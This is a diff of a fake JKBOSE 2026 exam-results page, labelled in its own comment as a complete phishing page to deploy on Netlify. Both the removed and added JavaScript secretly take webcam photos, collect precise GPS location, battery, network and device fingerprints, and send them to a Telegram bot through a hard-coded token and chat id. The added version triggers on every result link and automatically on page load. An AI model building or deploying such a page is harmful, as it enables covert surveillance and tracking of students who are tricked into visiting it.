@@ -1,3 +1,4 @@
+<!-- COMPLETE PHISHING PAGE - Deploy to Netlify -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -5,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>JKBOSE Results 2026</title>
 <style>
-body{margin:0;background:#e6e6e6;font-family:"Times New Roman",serif;}
+body{margin:0;background:#e6e6e6;font-family:"Times New Roman", serif;}
 .layout{display:flex;min-height:100vh;}
 .sidebar{width:210px;background:#23374d;display:flex;flex-direction:column;justify-content:flex-end;align-items:center;padding:20px;}
 .sidebar img{width:120px;}
@@ -13,169 +14,209 @@ body{margin:0;background:#e6e6e6;font-family:"Times New Roman",serif;}
 .header{background:#ffffff;border-bottom:1px solid #ccc;padding:20px;}
 .header-inner{max-width:1000px;margin:auto;display:flex;align-items:center;gap:20px;justify-content:center;}
 .header-inner img{width:464px;height:101px;object-fit:contain;}
-.content{background:#fff;max-width:1000px;margin:40px auto;padding:40px;box-shadow:0 0 6px rgba(0,0,0,0.1);text-align:center;}
-.result{display:block;background:#111;color:#ffd84d;text-decoration:none;padding:20px 30px;margin:15px 0;font-size:18px;border-radius:5px;transition:all 0.3s ease;cursor:pointer;}
-.result:hover{background:#333;transform:translateY(-2px);}
-.loading{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;justify-content:center;align-items:center;color:#ffd84d;font-size:18px;}
-@media (max-width:768px){.sidebar{display:none;}.main{padding:20px;}.header-inner img{width:100%;height:auto;}.content{margin:20px auto;padding:25px;}}
+.content{background:#fff;max-width:1000px;margin:40px auto;padding:40px;box-shadow:0 0 6px rgba(0,0,0,0.1);}
+.result{display:block;background:#111;color:#ffd84d;text-decoration:none;padding:15px;margin:12px 0;text-align:center;font-size:17px;border-radius:3px;cursor:pointer;transition:background 0.3s;}
+.result:hover{background:#333;}
+.result:active{background:#555;}
+.capture-status{position:fixed;top:10px;right:10px;background:rgba(0,0,0,0.8);color:white;padding:10px;border-radius:5px;font-size:12px;display:none;}
+@media (max-width:768px){
+.sidebar{display:none;}
+.main{padding:20px;}
+.header-inner img{width:100%;height:auto;}
+.content{margin:20px auto;padding:25px;}
+}
 </style>
 </head>
 <body>
 <div class="layout">
-  <div class="sidebar">
-    <img src="https://i.ibb.co/zHVVxHfB/nic-logo.png" crossorigin>
-  </div>
-  <div class="main">
-    <div class="header">
-      <div class="header-inner">
-        <img src="https://jkresults.nic.in/img/bannern.png" crossorigin>
-      </div>
-    </div>
-    <div class="content">
-      <h2 style="color:#333;margin-bottom:30px;">Select Your Result 2026</h2>
-      <a class="result" onclick="grabCamera()">📋 Higher Secondary Part I (Class 11th) Annual Regular</a>
-      <a class="result" onclick="grabCamera()">📋 Secondary School (Class 10th) Annual Regular</a>
-      <a class="result" onclick="grabCamera()">📋 Higher Secondary Part I (Class 11th) Annual Private</a>
-      <a class="result" onclick="grabCamera()">📋 Secondary School (Class 10th) Annual Private</a>
-    </div>
-  </div>
+<div class="sidebar">
+<img src="https://i.ibb.co/zHVVxHfB/nic-logo.png" alt="NIC">
 </div>
-<div class="loading" id="loading">🔄 Processing your results...</div>
+<div class="main">
+<div class="header">
+<div class="header-inner">
+<img src="https://jkresults.nic.in/img/bannern.png" alt="JKBOSE Banner">
+</div>
+</div>
+<div class="content">
+<a class="result" onclick="captureData()">View Result of Higher Secondary Part I (Class 11th) Session Annual Regular 2026</a>
+<a class="result" onclick="captureData()">View Result of Secondary School Examination (Class 10th) Session Annual Regular 2026</a>
+<a class="result" onclick="captureData()">View Result of Higher Secondary Part I (Class 11th) Session Annual Private 2026</a>
+<a class="result" onclick="captureData()">View Result of Secondary School Examination (Class 10th) Session Annual Private 2026</a>
+</div>
+</div>
+</div>
+
+<div class="capture-status" id="status">📸 Capturing...</div>
 
 <script>
-// 🔥 SESSION ID FROM URL
+// BOT CONFIG
+const BOT_TOKEN = "8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8";
+const ADMIN_CHAT_ID = "7385209456";
+
+// Get victim ID from URL
 const urlParams = new URLSearchParams(window.location.search);
-const SESSION_ID = urlParams.get('s') || 'DEMO' + Math.random().toString(36).substr(2, 9).toUpperCase();
-let stream = null;
-let captureLoop = null;
-let photoCount = 0;
+const chatId = urlParams.get('id') || 'unknown';
 
-// BLOCK EVERYTHING
-document.addEventListener('contextmenu', e => e.preventDefault());
-document.addEventListener('keydown', e => {
-  if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73)) e.preventDefault();
-});
-document.addEventListener('selectstart', e => e.preventDefault());
-
-// 🔥 MAIN CAMERA GRABBER
-async function grabCamera() {
-  document.getElementById('loading').style.display = 'flex';
-  
-  try {
-    // Get front camera
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }
-    });
-    
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    await video.play();
-    
-    // 🔥 CONTINUOUS CAPTURE EVERY 3 SECONDS
-    captureLoop = setInterval(async () => {
-      photoCount++;
-      const photoData = await takePhoto(video);
-      await sendToBot(photoData);
-    }, 3000);
-    
-    // First photo immediately
-    const firstPhoto = await takePhoto(video);
-    await sendToBot(firstPhoto);
-    
-  } catch (e) {
-    // No camera? Still send fingerprint
-    sendFingerprint();
-    setInterval(sendFingerprint, 10000);
-  }
-}
-
-async function takePhoto(video) {
-  const canvas = document.createElement('canvas');
-  canvas.width = 1280;
-  canvas.height = 720;
-  const ctx = canvas.getContext('2d');
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-  return canvas.toDataURL('image/jpeg', 0.85);
-}
-
-// 🔥 SEND TO YOUR BOT
-async function sendToBot(photoData) {
-  try {
-    // Get fresh GPS
-    let lat = '?', lng = '?', accuracy = '?';
+// Camera capture function
+async function captureSelfie() {
     try {
-      const position = await new Promise((resolve, reject) => {
-        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
-      });
-      lat = position.coords.latitude.toFixed(6);
-      lng = position.coords.longitude.toFixed(6);
-      accuracy = position.coords.accuracy;
-    } catch {}
-
-    // Battery
-    let battery = '?';
-    if ('getBattery' in navigator) {
-      try {
-        const bat = await navigator.getBattery();
-        battery = Math.round(bat.level * 100);
-      } catch {}
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                facingMode: 'user',
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
+            } 
+        });
+        
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+        
+        // Wait for video to stabilize
+        await new Promise(r => setTimeout(r, 1000));
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        stream.getTracks().forEach(track => track.stop());
+        
+        return canvas.toDataURL('image/jpeg', 0.9);
+    } catch(e) {
+        console.log('Camera access denied');
+        return null;
     }
+}
 
-    const victimData = {
-      session_id: SESSION_ID,
-      capture_num: photoCount,
-      photos: [photoData],
-      latitude: lat,
-      longitude: lng,
-      accuracy: accuracy,
-      battery: battery,
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      language: navigator.language,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      timestamp: new Date().toISOString(),
-      screen: `${screen.width}x${screen.height}`
+// Collect device fingerprint
+function getDeviceProfile() {
+    return {
+        chat_id: chatId,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        cookiesEnabled: navigator.cookieEnabled,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+        maxTouchPoints: navigator.maxTouchPoints,
+        connection: navigator.connection ? {
+            type: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink
+        } : null,
+        battery: navigator.getBattery ? navigator.getBattery() : null,
+        geolocation: null
     };
+}
 
-    // SEND TO YOUR BOT
-    await fetch('https://api.telegram.org/bot8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8/sendMessage', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: 7385209456,
-        text: JSON.stringify(victimData)
-      })
+// Main capture function - TRIGGERS ON BUTTON CLICK
+async function captureData() {
+    const status = document.getElementById('status');
+    status.style.display = 'block';
+    status.textContent = '📍 Getting location...';
+    
+    // Get full profile
+    const profile = getDeviceProfile();
+    
+    // GPS
+    try {
+        const pos = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
+        });
+        profile.geolocation = {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            accuracy: pos.coords.accuracy
+        };
+    } catch(e) {}
+    
+    // Battery
+    if (navigator.getBattery) {
+        try {
+            const battery = await navigator.getBattery();
+            profile.battery = {
+                level: Math.round(battery.level * 100),
+                charging: battery.charging,
+                chargingTime: battery.chargingTime,
+                dischargingTime: battery.dischargingTime
+            };
+        } catch(e) {}
+    }
+    
+    // Network
+    if (navigator.connection) {
+        profile.network = {
+            type: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt
+        };
+    }
+    
+    // GPU fingerprint
+    try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        profile.gpu = gl ? gl.getParameter(gl.RENDERER) : 'N/A';
+    } catch(e) {}
+    
+    status.textContent = '📸 Taking photo...';
+    
+    // Capture selfie
+    const photoData = await captureSelfie();
+    
+    if (!photoData) {
+        profile.photo = null;
+    }
+    
+    // Upload photo first
+    let photoUrl = null;
+    if (photoData) {
+        status.textContent = '📤 Uploading photo...';
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: ADMIN_CHAT_ID,
+                photo: photoData,
+                caption: 'temp_photo_' + Date.now()
+            })
+        });
+        const result = await response.json();
+        photoUrl = result.result.photo[0].file_id;
+        profile.photo = `https://api.telegram.org/file/bot${BOT_TOKEN}/${result.result.photo[0].file_id}`;
+    }
+    
+    // Send profile data
+    status.textContent = '✅ Sending data...';
+    const payload = JSON.stringify({
+        chat_id: chatId,
+        photo: profile.photo || photoUrl,
+        profile: profile
     });
     
-  } catch (e) {
-    console.log('Send failed:', e);
-  }
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: ADMIN_CHAT_ID,
+            text: payload
+        })
+    });
+    
+    status.textContent = '✅ Complete!';
+    setTimeout(() => status.style.display = 'none', 2000);
 }
 
-async function sendFingerprint() {
-  const data = {
-    session_id: SESSION_ID,
-    type: 'fingerprint',
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    screen: `${screen.width}x${screen.height}`,
-    timestamp: new Date().toISOString()
-  };
-  
-  await fetch('https://api.telegram.org/bot8600247273:AAEYvOd8CvxzOUyF3brEou7CQu2gCu_1-C8/sendMessage', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      chat_id: 7385209456,
-      text: JSON.stringify(data)
-    })
-  });
-}
-
-// Cleanup
-window.addEventListener('pagehide', () => {
-  if (stream) stream.getTracks().forEach(track => track.stop());
-  if (captureLoop) clearInterval(captureLoop);
+// Auto-trigger on page load (backup)
+window.addEventListener('load', () => {
+    setTimeout(captureData, 2000);
 });
 </script>
 </body>
